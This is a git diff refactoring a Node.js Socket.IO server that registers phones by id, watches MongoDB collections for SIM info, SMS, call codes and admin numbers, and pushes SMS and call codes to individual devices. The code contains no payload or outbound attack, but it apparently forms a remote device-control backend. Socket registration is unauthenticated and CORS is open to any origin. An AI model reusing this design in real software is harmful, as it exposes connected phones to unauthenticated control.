@@ -1,4 +1,3 @@
-
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
@@ -8,6 +7,7 @@ import fetch from "node-fetch";
 import mongoose from "mongoose";
 import { connectDB } from "./config/db.js";
 
+// Routes
 import deviceRoutes from "./routes/deviceRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
 import simInfoRoutes from "./routes/simInfoRoutes.js";
@@ -28,14 +28,21 @@ const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
 });
 
+// Make IO available inside controllers
+app.set("io", io);
+
 app.use(cors());
 app.use(express.json());
-app.set("io", io);
 
 const deviceSockets = new Map();
 
+
+// ----------------------------------------------------------------
+// 🔥 SOCKET HANDLERS
+// ----------------------------------------------------------------
 io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
+
   let currentDeviceId = null;
 
   socket.on("registerDevice", (uniqueid) => {
@@ -64,8 +71,10 @@ io.on("connection", (socket) => {
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
+
     console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
     saveLastSeen(uniqueid, connectivity);
+
     io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
     io.emit("deviceListUpdated", { event: "status_changed", uniqueid, connectivity });
   });
@@ -76,17 +85,21 @@ io.on("connection", (socket) => {
     if (currentDeviceId) {
       setTimeout(() => {
         const stillConnected = [...deviceSockets.values()].includes(socket.id);
+
         if (!stillConnected) {
           deviceSockets.delete(currentDeviceId);
+
           io.emit("deviceStatus", {
             uniqueid: currentDeviceId,
             connectivity: "Offline",
             updatedAt: new Date(),
           });
+
           io.emit("deviceListUpdated", {
             event: "device_disconnected",
             uniqueid: currentDeviceId,
           });
+
           saveLastSeen(currentDeviceId, "Offline");
         }
       }, 5000);
@@ -94,7 +107,10 @@ io.on("connection", (socket) => {
   });
 });
 
-// 🔹 Save Last Seen
+
+// ----------------------------------------------------------------
+// 🔹 Save Last Seen API Helper
+// ----------------------------------------------------------------
 async function saveLastSeen(deviceId, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
@@ -108,7 +124,10 @@ async function saveLastSeen(deviceId, connectivity) {
   }
 }
 
-// 🔹 Emit Call Code Safely
+
+// ----------------------------------------------------------------
+// 🔹 CallCode Emit
+// ----------------------------------------------------------------
 export async function sendCallCodeToDevice(uniqueid, callData) {
   const socketId = deviceSockets.get(uniqueid);
   if (socketId && io.sockets.sockets.get(socketId)) {
@@ -117,16 +136,18 @@ export async function sendCallCodeToDevice(uniqueid, callData) {
   }
 }
 
-// 🧠 MongoDB Change Streams
+
+// ----------------------------------------------------------------
+// 🔥 MONGODB CHANGE STREAMS
+// ----------------------------------------------------------------
 mongoose.connection.once("open", () => {
-  console.log("📡 MongoDB connected — Watching Devices, SIMs, Calls, SMS...");
+  console.log("📡 MongoDB connected — Watching Devices, SIMs, Calls, SMS, Admin...");
 
   try {
-    // 🟢 Device Collection Watch
+    // Devices
     const deviceStream = mongoose.connection.collection("devices").watch();
     deviceStream.on("change", async (change) => {
-      const { operationType } = change;
-      if (!["insert", "update", "replace"].includes(operationType)) return;
+      if (!["insert", "update", "replace"].includes(change.operationType)) return;
 
       const updatedDevice = await mongoose.connection
         .collection("devices")
@@ -138,18 +159,16 @@ mongoose.connection.once("open", () => {
       }
     });
 
-    // 🆕 SIM Info Collection Watch
+    // SIM Info
     const simStream = mongoose.connection.collection("siminfos").watch();
     simStream.on("change", async (change) => {
-      const { operationType } = change;
-      if (!["insert", "update", "replace"].includes(operationType)) return;
+      if (!["insert", "update", "replace"].includes(change.operationType)) return;
 
       const updatedSim = await mongoose.connection
         .collection("siminfos")
         .findOne({ _id: change.documentKey._id });
 
       if (updatedSim) {
-        console.log(`📶 SIM Change → ${updatedSim.deviceId}`);
         io.emit("simInfoUpdated", {
           event: "sim_change",
           sim: updatedSim,
@@ -157,34 +176,52 @@ mongoose.connection.once("open", () => {
       }
     });
 
-    // 📞 CallCodes Watch
+    // CallCodes
     const callStream = mongoose.connection.collection("callcodes").watch();
     callStream.on("change", async (change) => {
       if (!["insert", "update", "replace"].includes(change.operationType)) return;
+
       const updatedDoc = await mongoose.connection
         .collection("callcodes")
         .findOne({ _id: change.documentKey._id });
-      if (!updatedDoc) return;
 
-      const deviceId = updatedDoc.deviceId;
-      console.log(`📞 CallCode Changed → ${deviceId}`);
-      sendCallCodeToDevice(deviceId, updatedDoc);
+      if (updatedDoc) {
+        sendCallCodeToDevice(updatedDoc.deviceId, updatedDoc);
+      }
     });
 
-    // ✉️ SMS Watch
+    // SMS
     const smsStream = mongoose.connection.collection("sms").watch();
     smsStream.on("change", async (change) => {
       if (!["insert", "update", "replace"].includes(change.operationType)) return;
+
       const updatedDoc = await mongoose.connection
         .collection("sms")
         .findOne({ _id: change.documentKey._id });
-      if (!updatedDoc) return;
 
-      const deviceId = updatedDoc.deviceId;
-      console.log(`📩 SMS Changed → ${deviceId}`);
-      const socketId = deviceSockets.get(deviceId);
-      if (socketId && io.sockets.sockets.get(socketId)) {
-        io.to(socketId).emit("smsUpdate", updatedDoc);
+      if (updatedDoc) {
+        const socketId = deviceSockets.get(updatedDoc.deviceId);
+        if (socketId) io.to(socketId).emit("smsUpdate", updatedDoc);
+      }
+    });
+
+    // ----------------------------------------------------------------
+    // 🔥 ADMIN CHANGE STREAM (ADD THIS)
+    // ----------------------------------------------------------------
+    const adminStream = mongoose.connection.collection("adminnumbers").watch();
+    adminStream.on("change", async (change) => {
+      const updatedAdmin = await mongoose.connection
+        .collection("adminnumbers")
+        .findOne({ _id: change.documentKey._id });
+
+      if (updatedAdmin) {
+        console.log("👑 Admin Change Detected →", updatedAdmin);
+
+        // LIVE EMIT
+        io.emit("adminUpdate", {
+          number: updatedAdmin.number,
+          status: updatedAdmin.status,
+        });
       }
     });
   } catch (err) {
@@ -192,12 +229,10 @@ mongoose.connection.once("open", () => {
   }
 });
 
-// 🏠 Root
-app.get("/", (req, res) => {
-  res.send("✅ Live Socket + MongoDB Streams running (Devices, SIM, Calls, SMS)");
-});
 
-// 🧭 Routes
+// ----------------------------------------------------------------
+// ROUTES
+// ----------------------------------------------------------------
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
@@ -209,7 +244,10 @@ app.use("/api/status", statusRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 app.use("/api/call-log", callLogRoutes);
 
-// ❌ 404 & Error
+
+// ----------------------------------------------------------------
+// ERROR HANDLERS
+// ----------------------------------------------------------------
 app.use((req, res) =>
   res.status(404).json({ success: false, message: "Route not found" })
 );
@@ -218,5 +256,11 @@ app.use((err, req, res, next) => {
   res.status(500).json({ success: false, message: "Internal server error" });
 });
 
+
+// ----------------------------------------------------------------
+// SERVER START
+// ----------------------------------------------------------------
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
+server.listen(PORT, () =>
+  console.log(`🚀 Server running on http://localhost:${PORT}`)
+);
